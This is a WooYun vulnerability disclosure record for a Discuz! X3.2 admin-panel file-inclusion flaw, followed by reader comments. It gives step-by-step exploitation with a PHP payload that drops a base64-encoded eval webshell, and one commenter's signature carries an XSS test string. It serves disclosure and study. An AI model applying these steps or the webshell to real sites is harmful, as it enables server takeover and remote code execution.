{"id": 2445, "wybug_id": "wooyun-2014-065559", "wybug_title": "Discuz3.2后台文件包含漏洞可后台拿shell", "wybug_corp": "Discuz!", "wybug_author": "路人甲", "wybug_date": "2014-06-20 09:20", "wybug_open_date": "2014-08-04 09:22", "wybug_type": "文件包含", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["文件包含漏洞"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-06-20：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-06-20：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-06-23：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-08-14：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-08-24：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-09-03：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-08-04：\t细节向公众公开  简要描述： 最新版本：Discuz! X3.2 Release 20140618包括以前版本 详细说明：  由于创建专题时未对\n静态化名称\n做任何限制引发此漏洞1.全局->站点信息  网站 URL: http://www.comsenz.com/#<?php file_put_contents('0.php',base64_decode('PD9waHAgQGV2YWwoJF9QT1NUW2FdKTsgPz4='));?>\n\n2.工具->更新缓存 \n\n3.门户->HTML管理  静态文件扩展名: htm  专题HTML存放目录:data/cache\n\n4.创建专题  静态化名称[此处未做任何限制]：../../template/default/portal/portal_topic_test\n\n5.专题管理  对刚添加的专题 开启 并生成\n\n6.再次创建专题  模板名 选择刚生成的 ./template/default/portal/portal_topic_test.htm  提交\n\n  就执行了php代码 <?php file_put_contents('0.php',base64_decode('PD9waHAgQGV2YWwoJF9QT1NUW2FdKTsgPz4='));?>不仅仅是可以生成到专题目录，可以生成到任何可以包含的下面！   漏洞证明：  \n\n   修复方案：     版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2014-06-20 11:13 厂商回复： 感谢您对问题的提出，我们尽快予以修复 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-06-20 09:40 |    \t\tfelixk3y \t\t\t( 普通白帽子  |\t\t\t        Rank:523 漏洞数:41        | php python jsp)\t\t \n  你们把DZ后台拿shell的方法都报告完了，以后遇到DZ看你们杂办    \n     2014-06-20 09:43 |    \t\t小葵 \t\t\t( 实习白帽子  |\t\t\t        Rank:84 漏洞数:11        | 我们是害虫，我们是害虫！)\t\t \n  @felixk3y  眼瞅着手里可用的GETSHELL漏洞越来越少    内牛满面啊    \n     2014-06-20 10:53 |    \t\t兔兔侠 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        )\t\t \n  没漏洞了    \n     2014-06-20 13:42 |    \t\tphith0n  \t\t\t( 核心白帽子 |\t\t\t        Rank:656 漏洞数:107        | 一个想当文人的黑客~)\t\t \n  @felixk3y 就跟狗的漏洞一样。。。提交的人都是自断后路。。。    \n     2014-06-23 10:28 |    \t\t逗比 \t\t\t( 路人 |\t\t\t        Rank:20 漏洞数:6        | 逗比的年代，诶油我艹)\t\t \n  你们把DZ后台拿shell的方法都报告完了，以后遇到DZ看你们杂办     \n     2014-06-25 00:15 |    \t\tchinakid \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:3        | 小白一枚，爱好美女。)\t\t \n  你们把DZ后台拿shell的方法都报告完了，以后遇到DZ看你们杂办    \n     2014-07-02 19:50 |    \t\t暗影 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:4        | 0.0  0.0  0.0  0.0  0.0  0.0)\t\t \n  目测   他肯定找到了  新的方法    \n     2014-07-03 16:21 |    \t\t西顾 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 保守主义，展元爱好者，啥都不会)\t\t \n  mark好像看过一篇文件包含拿shell  难道是3.1 ？    \n     2014-07-13 16:51 |    \t\tCplusHua \t\t\t( 普通白帽子  |\t\t\t        Rank:238 漏洞数:33        | 乌云奖金:-1)\t\t \n  你们把DZ后台拿shell的方法都报告完了，以后遇到DZ看你们杂办    \n     2014-07-15 19:12 |    \t\t小小鸟 \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:6        | 小白一个)\t\t \n  你们把DZ后台拿shell的方法都报告完了，以后遇到DZ看你们杂办    \n     2014-07-23 11:20 |    \t\t小杰哥 \t\t\t( 普通白帽子  |\t\t\t        Rank:155 漏洞数:25        | 逆水行舟，不进则退。)\t\t \n  你们把DZ后台拿shell的方法都报告完了，以后遇到DZ看你们杂办     \n     2014-07-26 13:27 |    \t\t坠落。 \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:2        | -.- 屌丝一枚,菜鸟一个,擅长windows/linux...)\t\t \n  你们把DZ后台拿shell的方法都报告完了，以后遇到DZ看你们杂办    \n     2014-08-04 09:31 |    \t\tzhxs \t\t\t( 实习白帽子  |\t\t\t        Rank:32 漏洞数:19        | Jyhack-TeaM：http://bbs.jyhack.com/)\t\t \n  碰到dz的以后怎么拿shell    \n     2014-08-04 09:57 |    \t\t浮萍 \t\t\t( 普通白帽子  |\t\t\t        Rank:555 漏洞数:118        | 默默潜水)\t\t \n  肯定找到新的方法，更快捷    \n     2014-08-04 11:47 |    \t\tWangl \t\t\t( 实习白帽子  |\t\t\t        Rank:33 漏洞数:4        | 新浪支付，值得拥有)\t\t \n  你们把DZ后台拿shell的方法都报告完了，以后遇到DZ看你们杂办     \n     2014-08-20 13:10 |    \t\t叮咚叮咚 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:2        | 热爱生活，热爱技术)\t\t \n  你们把DZ后台拿shell的方法都报告完了，以后遇到DZ看你们杂办    \n     2014-08-21 00:00 |    \t\tfeather \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:4        | )( 我不是路人 |\t Rank:9999 漏洞数:0 |)\t\t \n  魔术师会解密一些魔术，但是大部分还是在业内共享。。。    \n     2014-08-24 21:16 |    \t\t兜帽 \t\t\t( 路人 |\t\t\t        Rank:3 漏洞数:3        | \"><script>alert(\"xss\")</script>)\t\t \n  你们把DZ后台拿shell的方法都报告完了，以后遇到DZ看你们杂办    \n     2014-09-06 10:29 |    \t\t Crazy3 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 对代码审计，漏洞挖掘很感兴趣)\t\t \n  你们把DZ后台拿shell的方法都报告完了，以后遇到DZ看你们杂办    \n     2014-10-24 16:11 |    \t\tnzk1912 \t\t\t( 实习白帽子  |\t\t\t        Rank:41 漏洞数:10        | 软件开发8年了，也来挖挖漏洞，为创建安全...)\t\t \n  后台拿SHELL有那么严重吗？要先有管理员权限吧    \n     2014-11-10 21:56 |    \t\th4ckhell00 \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:2        | 最温暖的两个字是什么？1、我在。2、别怕。...)\t\t \n  你们把DZ后台拿shell的方法都报告完了，以后遇到DZ看你们杂办    \n     2014-12-31 13:54 |    \t\t小渔小渔 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | 我就是我，我是小渔)\t\t \n  连SHELL都公布了。。那以后怎么拿？    \n     2015-08-08 22:34 |    \t\t颜筱诺 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 今天早上没吃药，感觉自己萌哒哒！！)\t\t \n  然并卵，先要后台权限。    \n     2015-08-22 20:39 |    \t\tChristopereRussell \t\t\t( 路人 |\t\t\t        Rank:1 漏洞数:1        | 高中生一只，爱好计算机)\t\t \n  你们把DZ后台拿shell的方法都报告完了，以后遇到DZ看你们杂办    \n     2015-09-23 03:14 |    \t\t邪少 \t\t\t( 实习白帽子  |\t\t\t        Rank:58 漏洞数:7        )\t\t \n  你们把DZ后台拿shell的方法都报告完了，以后遇到DZ看你们杂办    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}